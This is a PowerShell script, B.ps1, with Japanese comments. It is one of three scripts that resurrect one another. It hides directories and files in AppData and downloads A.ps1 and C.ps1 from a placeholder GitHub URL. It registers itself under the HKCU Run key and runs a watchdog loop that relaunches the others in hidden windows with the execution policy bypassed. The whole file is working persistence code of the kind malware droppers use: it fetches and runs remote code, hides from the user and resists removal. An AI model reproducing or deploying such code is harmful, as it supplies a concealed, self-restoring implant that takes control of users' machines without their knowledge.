# B.ps1

# --- 設定 ---

$SpreadDirs = @(
    "$env:APPDATA\Microsoft\Windows",   # A.ps1用
    "$env:LOCALAPPDATA\TempData",       # B.ps1用（自身の配置先）
    "$env:APPDATA\Packages"              # C.ps1用
)

$Urls = @{
    "A" = "https://raw.githubusercontent.com/YourRepo/OrgScripts/main/A.ps1"
    "C" = "https://raw.githubusercontent.com/YourRepo/OrgScripts/main/C.ps1"
}

$RegNameB = "OrgScriptB"

# --- 関数群（A.ps1と同じものを入れてください） ---

function SetHiddenAttribute($path) {
    if (Test-Path $path) {
        attrib +h $path
    }
}

function Get-FileSHA256($path) {
    if (Test-Path $path) {
        return (Get-FileHash -Path $path -Algorithm SHA256).Hash
    }
    return $null
}

function DownloadFileTemp($url, $tempPath) {
    try {
        Invoke-WebRequest -Uri $url -UseBasicParsing -OutFile $tempPath -ErrorAction Stop
        return $true
    } catch {
        return $false
    }
}

function StartupCheckAndRestore($fileName, $url, $targetDir) {
    $tempFile = Join-Path $env:TEMP "$fileName.tmp"
    $localPath = Join-Path $targetDir $fileName

    if (-not (DownloadFileTemp $url $tempFile)) {
        return $localPath
    }

    $remoteHash = Get-FileSHA256 $tempFile

    if (-not (Test-Path $localPath) -or (Get-FileSHA256 $localPath) -ne $remoteHash) {
        Copy-Item -Path $tempFile -Destination $localPath -Force
        SetHiddenAttribute $localPath
    }

    Remove-Item $tempFile -Force -ErrorAction SilentlyContinue

    return $localPath
}

function IsScriptRunning($scriptName) {
    $procs = Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" | Where-Object {
        $_.CommandLine -like "*$scriptName*"
    }
    return $procs
}

function StopScriptProcesses($scriptName) {
    $procs = IsScriptRunning $scriptName
    foreach ($proc in $procs) {
        Stop-Process -Id $proc.ProcessId -Force -ErrorAction SilentlyContinue
    }
}

function StartHiddenScript($scriptPath) {
    $scriptName = [System.IO.Path]::GetFileName($scriptPath)
    if ((IsScriptRunning $scriptName).Count -eq 0) {
        Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath`""
    }
}

function IsStartupRegistered($name) {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $val = Get-ItemProperty -Path $regPath -Name $name -ErrorAction SilentlyContinue
    return $null -ne $val
}

function RegisterStartup($name, $scriptPath) {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $quotedPath = "`"$scriptPath`""
    try {
        Set-ItemProperty -Path $regPath -Name $name -Value $quotedPath
    } catch {}
}

function CheckAndReRegisterStartup($name, $scriptPath) {
    if (-not (IsStartupRegistered $name)) {
        RegisterStartup $name $scriptPath
    }
}

# 隠しディレクトリがなければ作成＆隠し属性付与
foreach ($dir in $SpreadDirs) {
    if (-not (Test-Path $dir)) {
        New-Item -ItemType Directory -Path $dir -Force | Out-Null
        attrib +h $dir
    }
}

# A と C の最新コードを復元・取得
$PathA = StartupCheckAndRestore "A.ps1" $Urls["A"] $SpreadDirs[0]
$PathC = StartupCheckAndRestore "C.ps1" $Urls["C"] $SpreadDirs[2]

# スタートアップ登録（B.ps1の現在の実行パス）
CheckAndReRegisterStartup $RegNameB $MyInvocation.MyCommand.Path

# 監視対象スクリプトのハッシュを保持
$MonitorScripts = @{
    "A.ps1" = Get-FileSHA256 $PathA
    "C.ps1" = Get-FileSHA256 $PathC
}

$MonitorPaths = @{
    "A.ps1" = $PathA
    "C.ps1" = $PathC
}

# 監視ループ：ハッシュ変化検知で再起動、停止や未起動なら起動
while ($true) {
    foreach ($script in $MonitorScripts.Keys) {
        $currentPath = $MonitorPaths[$script]
        $currentHash = Get-FileSHA256 $currentPath

        if ($currentHash -ne $MonitorScripts[$script]) {
            StopScriptProcesses $script
            StartHiddenScript $currentPath
            $MonitorScripts[$script] = $currentHash
        } else {
            if ((IsScriptRunning $script).Count -eq 0) {
                StartHiddenScript $currentPath
            }
        }
    }
    Start-Sleep -Seconds 10
}
